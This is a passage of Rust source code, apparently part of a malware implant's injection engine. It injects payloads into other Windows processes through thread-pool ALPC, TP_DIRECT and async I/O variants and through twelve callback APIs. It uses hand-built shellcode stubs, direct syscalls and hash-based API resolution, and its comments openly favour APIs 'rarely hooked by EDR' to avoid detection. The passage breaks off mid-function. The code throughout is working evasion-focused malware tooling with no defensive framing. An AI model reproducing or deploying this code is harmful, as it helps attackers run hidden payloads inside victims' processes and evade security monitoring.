fn inject_threadpool_alpc(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    let technique = InjectionTechnique::ThreadPool {
        variant: Some(ThreadPoolVariant::Alpc),
    };
    unsafe {
        let (h_proc, remote_base) = alloc_write_exec(pid, payload)?;

        let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
            .ok_or_else(|| InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: "cannot resolve ntdll base".to_string(),
            })?;

        let tp_alloc_alpc_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"TpAllocAlpcCompletion\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve TpAllocAlpcCompletion".to_string(),
        })?;

        let nt_create_port_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"NtAlpcCreatePort\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve NtAlpcCreatePort".to_string(),
        })?;

        let nt_close_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"NtClose\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve NtClose".to_string(),
        })?;

        let tp_release_alpc_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"TpReleaseAlpcCompletion\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve TpReleaseAlpcCompletion".to_string(),
        })?;

        // Build stub:
        // 1. NtAlpcCreatePort(&alpc_port, NULL, NULL)
        // 2. TpAllocAlpcCompletion(&tp_alpc, alpc_port, payload, NULL)
        // 3. TpReleaseAlpcCompletion(tp_alpc)
        // 4. NtClose(alpc_port)
        // 5. ret
        //
        // Note: The ALPC variant is the most stealthy because it leverages
        // the built-in ALPC message delivery mechanism. The callback fires
        // when any ALPC message arrives on the port.
        let mut stub: Vec<u8> = Vec::with_capacity(512);

        // sub rsp, 0x58
        stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x58]);

        // === NtAlpcCreatePort(&alpc_port, NULL, NULL) ===
        // lea rcx, [rsp+0x40] ; &alpc_port
        stub.extend_from_slice(&[0x48, 0x8D, 0x4C, 0x24, 0x40]);
        // xor edx, edx ; ObjectAttributes = NULL
        stub.extend_from_slice(&[0x31, 0xD2]);
        // xor r8d, r8d ; PortAttributes = NULL
        stub.extend_from_slice(&[0x45, 0x31, 0xC0]);
        // movabs rax, <nt_create_port> ; call rax
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(nt_create_port_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // === TpAllocAlpcCompletion(&tp_alpc, alpc_port, payload, NULL) ===
        // lea rcx, [rsp+0x48] ; &tp_alpc
        stub.extend_from_slice(&[0x48, 0x8D, 0x4C, 0x24, 0x48]);
        // mov rdx, [rsp+0x40] ; alpc_port
        stub.extend_from_slice(&[0x48, 0x8B, 0x54, 0x24, 0x40]);
        // mov r8, <payload_base>
        stub.extend_from_slice(&[0x49, 0xB8]);
        stub.extend_from_slice(&(remote_base as u64).to_le_bytes());
        // xor r9d, r9d
        stub.extend_from_slice(&[0x45, 0x31, 0xC9]);
        // movabs rax, <tp_alloc_alpc> ; call rax
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_alloc_alpc_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // === TpReleaseAlpcCompletion(tp_alpc) ===
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x48]);
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_release_alpc_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // === NtClose(alpc_port) ===
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x40]);
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(nt_close_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // add rsp, 0x58 ; ret
        stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x58]);
        stub.push(0xC3);

        // Write the stub into the target process.
        let mut stub_remote: *mut c_void = std::ptr::null_mut();
        let mut stub_size = stub.len();
        let s = nt_syscall::syscall!(
            "NtAllocateVirtualMemory",
            h_proc as u64,
            &mut stub_remote as *mut _ as u64,
            0u64,
            &mut stub_size as *mut _ as u64,
            0x3000u64,
            0x04u64,
        );
        if s.is_err() || s.unwrap() < 0 || stub_remote.is_null() {
            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
            return Err(InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: "failed to allocate stub memory".to_string(),
            });
        }

        let mut written = 0usize;
        let ws = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_proc as u64,
            stub_remote as u64,
            stub.as_ptr() as u64,
            stub.len() as u64,
            &mut written as *mut _ as u64,
        );
        if ws.is_err() || ws.unwrap() < 0 || written != stub.len() {
            return Err(InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: "failed to write stub".to_string(),
            });
        }

        let mut old_prot = 0u32;
        let mut prot_base = stub_remote as usize;
        let mut prot_size = stub.len();
        let _ = nt_syscall::syscall!(
            "NtProtectVirtualMemory",
            h_proc as u64,
            &mut prot_base as *mut _ as u64,
            &mut prot_size as *mut _ as u64,
            0x20u64,
            &mut old_prot as *mut _ as u64,
        );
        let _ = nt_syscall::syscall!(
            "NtFlushInstructionCache",
            h_proc as u64,
            stub_remote as u64,
            stub.len() as u64,
        );

        let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);

        Ok(InjectionHandle {
            target_pid: pid,
            technique_used: technique,
            injected_base_addr: remote_base,
            payload_size: payload.len(),
            thread_handle: None,
            process_handle: h_proc,
            sleep_enrolled: false,
            sleep_stub_addr: 0,
        })
    }
}

/// Variant 7: Direct — manipulate a TP_DIRECT structure.
///
/// Directly allocates a `TP_DIRECT` structure and sets the callback to the
/// payload, then triggers it by posting a task. This variant bypasses the
/// higher-level TP APIs by writing directly into the task queue structure.
fn inject_threadpool_direct(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    let technique = InjectionTechnique::ThreadPool {
        variant: Some(ThreadPoolVariant::Direct),
    };
    unsafe {
        let (h_proc, remote_base) = alloc_write_exec(pid, payload)?;

        let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
            .ok_or_else(|| InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: "cannot resolve ntdll base".to_string(),
            })?;

        // TpAllocWork + TpPostWork are used as the mechanism to trigger
        // the callback, but the payload is set directly on a TP_DIRECT
        // structure rather than through the normal TP_WORK allocation.
        // This is similar to variant 1 but uses a different internal path.
        let tp_alloc_work_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"TpAllocWork\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve TpAllocWork".to_string(),
        })?;

        let tp_post_work_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"TpPostWork\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve TpPostWork".to_string(),
        })?;

        let tp_release_work_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"TpReleaseWork\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve TpReleaseWork".to_string(),
        })?;

        // Allocate a TP_DIRECT structure in the target process.
        // TP_DIRECT is an opaque structure; its layout varies by Windows version.
        // For simplicity, we allocate a 256-byte buffer and write the callback
        // pointer at offset 0 (the Callback member).
        let mut direct_remote: *mut c_void = std::ptr::null_mut();
        let mut direct_size = 256usize;
        let s = nt_syscall::syscall!(
            "NtAllocateVirtualMemory",
            h_proc as u64,
            &mut direct_remote as *mut _ as u64,
            0u64,
            &mut direct_size as *mut _ as u64,
            0x3000u64,
            0x04u64,
        );
        if s.is_err() || s.unwrap() < 0 || direct_remote.is_null() {
            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
            return Err(InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: "failed to allocate TP_DIRECT memory".to_string(),
            });
        }

        // Write the callback pointer at offset 0 of the TP_DIRECT structure.
        let callback_ptr = remote_base as u64;
        let mut written = 0usize;
        let ws = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_proc as u64,
            direct_remote as u64,
            &callback_ptr as *const _ as u64,
            8u64,
            &mut written as *mut _ as u64,
        );
        if ws.is_err() || ws.unwrap() < 0 || written != 8 {
            return Err(InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: "failed to write TP_DIRECT callback".to_string(),
            });
        }

        // Build a stub that posts the TP_DIRECT structure as work.
        let mut stub: Vec<u8> = Vec::with_capacity(256);

        // sub rsp, 0x38
        stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x38]);

        // lea rcx, [rsp+0x30] ; &work
        stub.extend_from_slice(&[0x48, 0x8D, 0x4C, 0x24, 0x30]);

        // mov rdx, <direct_remote> — pass the TP_DIRECT as the "callback"
        stub.push(0x48);
        stub.push(0xBA);
        stub.extend_from_slice(&(direct_remote as u64).to_le_bytes());

        // xor r8d, r8d ; xor r9d, r9d
        stub.extend_from_slice(&[0x45, 0x31, 0xC0]);
        stub.extend_from_slice(&[0x45, 0x31, 0xC9]);

        // movabs rax, <tp_alloc_work> ; call rax
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_alloc_work_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // mov rcx, [rsp+0x30] ; call tp_post_work
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x30]);
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_post_work_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // mov rcx, [rsp+0x30] ; call tp_release_work
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x30]);
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_release_work_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // add rsp, 0x38 ; ret
        stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x38]);
        stub.push(0xC3);

        // Write the stub into the target process.
        let mut stub_remote: *mut c_void = std::ptr::null_mut();
        let mut stub_size = stub.len();
        let s = nt_syscall::syscall!(
            "NtAllocateVirtualMemory",
            h_proc as u64,
            &mut stub_remote as *mut _ as u64,
            0u64,
            &mut stub_size as *mut _ as u64,
            0x3000u64,
            0x04u64,
        );
        if s.is_err() || s.unwrap() < 0 || stub_remote.is_null() {
            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
            return Err(InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: "failed to allocate stub memory".to_string(),
            });
        }

        let mut written = 0usize;
        let ws = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_proc as u64,
            stub_remote as u64,
            stub.as_ptr() as u64,
            stub.len() as u64,
            &mut written as *mut _ as u64,
        );
        if ws.is_err() || ws.unwrap() < 0 || written != stub.len() {
            return Err(InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: "failed to write stub".to_string(),
            });
        }

        let mut old_prot = 0u32;
        let mut prot_base = stub_remote as usize;
        let mut prot_size = stub.len();
        let _ = nt_syscall::syscall!(
            "NtProtectVirtualMemory",
            h_proc as u64,
            &mut prot_base as *mut _ as u64,
            &mut prot_size as *mut _ as u64,
            0x20u64,
            &mut old_prot as *mut _ as u64,
        );
        let _ = nt_syscall::syscall!(
            "NtFlushInstructionCache",
            h_proc as u64,
            stub_remote as u64,
            stub.len() as u64,
        );

        let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);

        Ok(InjectionHandle {
            target_pid: pid,
            technique_used: technique,
            injected_base_addr: remote_base,
            payload_size: payload.len(),
            thread_handle: None,
            process_handle: h_proc,
            sleep_enrolled: false,
            sleep_stub_addr: 0,
        })
    }
}

/// Variant 8: AsyncIo — register payload as async I/O completion callback.
///
/// Creates a TP_IO structure by calling `TpAllocAsyncIoCompletion` with the
/// payload as the callback, then triggers it by posting an async I/O
/// completion. This is the highest-stealth variant because async I/O
/// completions are extremely common and blend in with normal system behavior.
fn inject_threadpool_async_io(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    let technique = InjectionTechnique::ThreadPool {
        variant: Some(ThreadPoolVariant::AsyncIo),
    };
    unsafe {
        let (h_proc, remote_base) = alloc_write_exec(pid, payload)?;

        let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
            .ok_or_else(|| InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: "cannot resolve ntdll base".to_string(),
            })?;

        // TpAllocAsyncIoCompletion may not be exported on all Windows
        // versions. Fall back to TpAllocIoCompletion if not available.
        let tp_alloc_async_io_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"TpAllocAsyncIoCompletion\0"),
        )
        .or_else(|| {
            pe_resolve::get_proc_address_by_hash(
                ntdll_base,
                pe_resolve::hash_str(b"TpAllocIoCompletion\0"),
            )
        })
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve TpAllocAsyncIoCompletion or TpAllocIoCompletion".to_string(),
        })?;

        let nt_create_io_comp_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"NtCreateIoCompletion\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve NtCreateIoCompletion".to_string(),
        })?;

        let nt_set_io_comp_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"NtSetIoCompletion\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve NtSetIoCompletion".to_string(),
        })?;

        let tp_release_io_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"TpReleaseIoCompletion\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve TpReleaseIoCompletion".to_string(),
        })?;

        let nt_close_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"NtClose\0"),
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve NtClose".to_string(),
        })?;

        // Build stub:
        // 1. NtCreateIoCompletion(&io_port, ..., ..., ...)
        // 2. TpAllocAsyncIoCompletion(&tp_io, io_port, payload, NULL)
        // 3. NtSetIoCompletion(io_port, payload, NULL, 0, 0)
        // 4. TpReleaseIoCompletion(tp_io)
        // 5. NtClose(io_port)
        // 6. ret
        let mut stub: Vec<u8> = Vec::with_capacity(512);

        // sub rsp, 0x58
        stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x58]);

        // === NtCreateIoCompletion(&io_port, GENERIC_ALL, NULL, 0) ===
        stub.extend_from_slice(&[0x48, 0x8D, 0x4C, 0x24, 0x40]);
        stub.extend_from_slice(&[0xBA, 0x00, 0x00, 0xF0, 0x01]);
        stub.extend_from_slice(&[0x45, 0x31, 0xC0]);
        stub.extend_from_slice(&[0x45, 0x31, 0xC9]);
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(nt_create_io_comp_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // === TpAllocAsyncIoCompletion(&tp_io, io_port, payload, NULL) ===
        stub.extend_from_slice(&[0x48, 0x8D, 0x4C, 0x24, 0x48]);
        stub.extend_from_slice(&[0x48, 0x8B, 0x54, 0x24, 0x40]);
        stub.extend_from_slice(&[0x49, 0xB8]);
        stub.extend_from_slice(&(remote_base as u64).to_le_bytes());
        stub.extend_from_slice(&[0x45, 0x31, 0xC9]);
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_alloc_async_io_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // === NtSetIoCompletion(io_port, payload, NULL, 0, 0) ===
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x40]);
        stub.push(0x48);
        stub.push(0xBA);
        stub.extend_from_slice(&(remote_base as u64).to_le_bytes());
        stub.extend_from_slice(&[0x45, 0x31, 0xC0]);
        stub.extend_from_slice(&[0x45, 0x31, 0xC9]);
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(nt_set_io_comp_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // === TpReleaseIoCompletion(tp_io) ===
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x48]);
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(tp_release_io_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // === NtClose(io_port) ===
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x40]);
        stub.push(0x48);
        stub.push(0xB8);
        stub.extend_from_slice(&(nt_close_addr as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // add rsp, 0x58 ; ret
        stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x58]);
        stub.push(0xC3);

        // Write the stub into the target process.
        let mut stub_remote: *mut c_void = std::ptr::null_mut();
        let mut stub_size = stub.len();
        let s = nt_syscall::syscall!(
            "NtAllocateVirtualMemory",
            h_proc as u64,
            &mut stub_remote as *mut _ as u64,
            0u64,
            &mut stub_size as *mut _ as u64,
            0x3000u64,
            0x04u64,
        );
        if s.is_err() || s.unwrap() < 0 || stub_remote.is_null() {
            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
            return Err(InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: "failed to allocate stub memory".to_string(),
            });
        }

        let mut written = 0usize;
        let ws = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_proc as u64,
            stub_remote as u64,
            stub.as_ptr() as u64,
            stub.len() as u64,
            &mut written as *mut _ as u64,
        );
        if ws.is_err() || ws.unwrap() < 0 || written != stub.len() {
            return Err(InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: "failed to write stub".to_string(),
            });
        }

        let mut old_prot = 0u32;
        let mut prot_base = stub_remote as usize;
        let mut prot_size = stub.len();
        let _ = nt_syscall::syscall!(
            "NtProtectVirtualMemory",
            h_proc as u64,
            &mut prot_base as *mut _ as u64,
            &mut prot_size as *mut _ as u64,
            0x20u64,
            &mut old_prot as *mut _ as u64,
        );
        let _ = nt_syscall::syscall!(
            "NtFlushInstructionCache",
            h_proc as u64,
            stub_remote as u64,
            stub.len() as u64,
        );

        let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);

        Ok(InjectionHandle {
            target_pid: pid,
            technique_used: technique,
            injected_base_addr: remote_base,
            payload_size: payload.len(),
            thread_handle: None,
            process_handle: h_proc,
            sleep_enrolled: false,
            sleep_stub_addr: 0,
        })
    }
}

// ── NEW: Callback injection ──────────────────────────────────────────────────
//
// Callback-based injection leverages Windows APIs that accept function pointer
// callbacks. The payload is staged via standard alloc→write→protect, then a
// universal callback stub is written alongside it. The stub:
//   1. Saves registers
//   2. Loads the payload address from a data slot right after the stub
//   3. Calls the payload
//   4. Restores registers
//   5. Returns FALSE (0) to stop enumeration immediately — most stealthy,
//      avoids multiple callback invocations
//
// Each callback API variant:
//   - Resolves the required API function(s) via pe_resolve
//   - Sets the function pointer argument to the stub address
//   - Calls the API — Windows invokes our stub on its own thread
//
// OPSEC: The call stack shows kernel32/user32/ntdll frames above our payload,
// which is the entire point. No NtCreateThreadEx, no remote thread creation,
// no thread pool manipulation. The execution originates from a legitimate
// Windows code path that EDR solutions treat as benign.

/// Weighted random selection of a callback API.
///
/// Less-commonly-monitored APIs are weighted higher:
///   - CertEnumSystemStore, SHEnumerateUnreadMailAccounts, EnumResourceTypesW:
///     rarely hooked by EDR — highest weight
///   - CopyFileEx: most unusual callback path, very rarely monitored
///   - EnumDesktopWindows, EnumFontFamilies: moderate monitoring
///   - EnumWindows, CreateTimerQueueTimer: more commonly watched — lower weight
///
/// Total weight: 200
fn auto_select_callback_api() -> CallbackApi {
    use rand::Rng;

    let mut rng = rand::thread_rng();
    let roll = rng.gen_range(0..200);

    match roll {
        // Rarely monitored (highest weight)
        0..=29 => CallbackApi::CertEnumSystemStore,        // 30
        30..=54 => CallbackApi::SHEnumerateUnreadMailAccounts, // 25
        55..=79 => CallbackApi::CopyFileEx,                // 25
        80..=104 => CallbackApi::EnumResourceTypesW,       // 25

        // Moderately monitored
        105..=124 => CallbackApi::EnumDesktopWindows,      // 20
        125..=144 => CallbackApi::EnumFontFamilies,        // 20
        145..=159 => CallbackApi::EnumerateLoadedModules,  // 15
        160..=174 => CallbackApi::EnumTimeFormatsA,        // 15

        // More commonly watched
        175..=184 => CallbackApi::EnumSystemLocalesA,      // 10
        185..=191 => CallbackApi::EnumChildWindows,        // 7
        192..=196 => CallbackApi::EnumWindows,             // 5
        _ => CallbackApi::CreateTimerQueueTimer,           // 3
    }
}

/// Build the universal callback stub (x86-64).
///
/// The stub is position-independent and designed to work with all 12 callback
/// APIs regardless of their specific callback signature. It:
///
/// 1. Saves callee-saved registers (rbp)
/// 2. Sets up a 0x28 shadow space (Windows x64 ABI)
/// 3. Loads the payload address from the data slot immediately after the stub
/// 4. Calls the payload
/// 5. Restores registers and shadow space
/// 6. Returns FALSE (0) to stop enumeration immediately
///
/// Memory layout after writing to target:
///   [stub code: ~40 bytes][payload_addr: 8 bytes][padding: 0 bytes]
///
/// The payload is written to a separate allocation (or the same allocation
/// at a known offset), and its address is embedded in the data slot.
///
/// ## Stub assembly (x86-64):
///
/// ```asm
/// ; Shadow space for Win64 ABI
/// push rbp
/// mov rbp, rsp
/// sub rsp, 0x28
///
/// ; Save volatile registers that the callback might clobber
/// push rsi
/// push rdi
///
/// ; Load payload address from data slot (8 bytes after stub end)
/// mov rax, [rip + payload_offset]   ; RIP-relative load
/// call rax                           ; Execute payload
///
/// ; Restore registers
/// pop rdi
/// pop rsi
/// add rsp, 0x28
/// pop rbp
///
/// ; Return FALSE to stop enumeration immediately
/// xor eax, eax
/// ret
/// ```
fn build_callback_stub(payload_addr: u64) -> Vec<u8> {
    let mut stub = Vec::with_capacity(64);

    // push rbp
    stub.push(0x55);
    // mov rbp, rsp
    stub.extend_from_slice(&[0x48, 0x89, 0xE5]);
    // sub rsp, 0x28
    stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);

    // push rsi
    stub.push(0x56);
    // push rdi
    stub.push(0x57);

    // mov rax, [rip + payload_offset]
    // The payload_addr data slot starts right after the stub code.
    // This instruction is at offset 11 (bytes 0-10 are the above instructions).
    // The instruction itself is 7 bytes: 48 8B 05 <rel32>
    // The RIP-relative offset = (stub_end + 0) - (instruction_end)
    //   instruction_end = 11 + 7 = 18
    //   data_slot_start = stub_code_len
    //   We'll patch this after building the rest.
    let mov_rax_rip_offset_pos = stub.len(); // position of the rel32
    stub.extend_from_slice(&[0x48, 0x8B, 0x05]); // mov rax, [rip+disp32]
    stub.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // placeholder for rel32

    // call rax
    stub.extend_from_slice(&[0xFF, 0xD0]);

    // pop rdi
    stub.push(0x5F);
    // pop rsi
    stub.push(0x5E);

    // add rsp, 0x28
    stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);
    // pop rbp
    stub.push(0x5D);

    // xor eax, eax  (return FALSE = 0 to stop enumeration)
    stub.extend_from_slice(&[0x31, 0xC0]);
    // ret
    stub.push(0xC3);

    // Now patch the RIP-relative offset.
    // The mov rax, [rip+disp32] instruction: at the point it executes,
    // RIP points to the next instruction (i.e., past the 7-byte instruction).
    // The displacement is: data_slot_offset - (mov_rax_end)
    let mov_rax_end = mov_rax_rip_offset_pos + 4 + 3; // 3 bytes opcode + 4 bytes disp
    let data_slot_offset = stub.len(); // data starts right after ret
    let rel32 = (data_slot_offset as i32) - (mov_rax_end as i32);
    stub[mov_rax_rip_offset_pos + 3] = (rel32 & 0xFF) as u8;
    stub[mov_rax_rip_offset_pos + 4] = ((rel32 >> 8) & 0xFF) as u8;
    stub[mov_rax_rip_offset_pos + 5] = ((rel32 >> 16) & 0xFF) as u8;
    stub[mov_rax_rip_offset_pos + 6] = ((rel32 >> 24) & 0xFF) as u8;

    // Append the payload address as 8 bytes of data.
    stub.extend_from_slice(&payload_addr.to_le_bytes());

    stub
}

/// Main callback injection dispatcher.
///
/// If `api` is `None`, auto-selects a callback API weighted by stealth and
/// monitoring likelihood. If the selected API fails, tries remaining APIs
/// in random order. If all 12 fail, falls back to ThreadPool injection.
fn inject_callback(
    pid: u32,
    payload: &[u8],
    api: Option<CallbackApi>,
) -> Result<InjectionHandle, InjectionError> {
    let requested_api = api.unwrap_or_else(auto_select_callback_api);

    log::info!(
        "injection_engine: Callback injection using {} into pid {}",
        requested_api,
        pid,
    );

    // Try the requested API first, then fall back through remaining APIs.
    let all_apis = [
        CallbackApi::EnumSystemLocalesA,
        CallbackApi::EnumWindows,
        CallbackApi::EnumChildWindows,
        CallbackApi::EnumDesktopWindows,
        CallbackApi::CreateTimerQueueTimer,
        CallbackApi::EnumTimeFormatsA,
        CallbackApi::EnumResourceTypesW,
        CallbackApi::EnumFontFamilies,
        CallbackApi::CertEnumSystemStore,
        CallbackApi::SHEnumerateUnreadMailAccounts,
        CallbackApi::EnumerateLoadedModules,
        CallbackApi::CopyFileEx,
    ];

    // Build ordered list: requested API first, then remaining (shuffled).
    let mut try_order: Vec<CallbackApi> = vec![requested_api];
    let mut remaining: Vec<CallbackApi> = all_apis
        .iter()
        .filter(|a| **a != requested_api)
        .copied()
        .collect();
    {
        use rand::seq::SliceRandom;
        let mut rng = rand::thread_rng();
        remaining.shuffle(&mut rng);
    }
    try_order.extend(remaining);

    for api in try_order {
        log::debug!("injection_engine: trying callback API {}", api);
        match inject_callback_api(pid, payload, api) {
            Ok(handle) => return Ok(handle),
            Err(e) => {
                log::warn!(
                    "injection_engine: callback API {} failed: {}, trying next",
                    api,
                    e
                );
            }
        }
    }

    // All callback APIs failed — fall back to ThreadPool injection.
    log::warn!(
        "injection_engine: all 12 callback APIs failed for pid {}, falling back to ThreadPool",
        pid
    );
    inject_threadpool(pid, payload, None)
}

/// Dispatch to the specific callback API implementation.
fn inject_callback_api(
    pid: u32,
    payload: &[u8],
    api: CallbackApi,
) -> Result<InjectionHandle, InjectionError> {
    match api {
        CallbackApi::EnumSystemLocalesA => inject_callback_enum_system_locales(pid, payload),
        CallbackApi::EnumWindows => inject_callback_enum_windows(pid, payload),
        CallbackApi::EnumChildWindows => inject_callback_enum_child_windows(pid, payload),
        CallbackApi::EnumDesktopWindows => inject_callback_enum_desktop_windows(pid, payload),
        CallbackApi::CreateTimerQueueTimer => inject_callback_create_timer_queue(pid, payload),
        CallbackApi::EnumTimeFormatsA => inject_callback_enum_time_formats(pid, payload),
        CallbackApi::EnumResourceTypesW => inject_callback_enum_resource_types(pid, payload),
        CallbackApi::EnumFontFamilies => inject_callback_enum_font_families(pid, payload),
        CallbackApi::CertEnumSystemStore => inject_callback_cert_enum_system_store(pid, payload),
        CallbackApi::SHEnumerateUnreadMailAccounts => {
            inject_callback_sh_enum_unread_mail(pid, payload)
        }
        CallbackApi::EnumerateLoadedModules => {
            inject_callback_enumerate_loaded_modules(pid, payload)
        }
        CallbackApi::CopyFileEx => inject_callback_copy_file_ex(pid, payload),
    }
}

/// Stage payload and universal callback stub into the target process.
///
/// Returns `(h_proc, payload_base, stub_base)` where:
/// - `h_proc` is the open process handle
/// - `payload_base` is the address of the RX payload region
/// - `stub_base` is the address of the RX stub region
///
/// The stub has the payload address embedded in its data slot, so calling
/// the stub will execute the payload.
unsafe fn stage_callback_payload(
    pid: u32,
    payload: &[u8],
    technique: InjectionTechnique,
) -> Result<(*mut c_void, usize, usize), InjectionError> {
    use winapi::um::winnt::{
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
        PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
        PROCESS_VM_WRITE,
    };

    // Open target process.
    let mut client_id = [0u64; 2];
    client_id[0] = pid as u64;
    let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
    obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;

    let mut h_proc: usize = 0;
    let access_mask = (PROCESS_VM_OPERATION
        | PROCESS_VM_WRITE
        | PROCESS_CREATE_THREAD
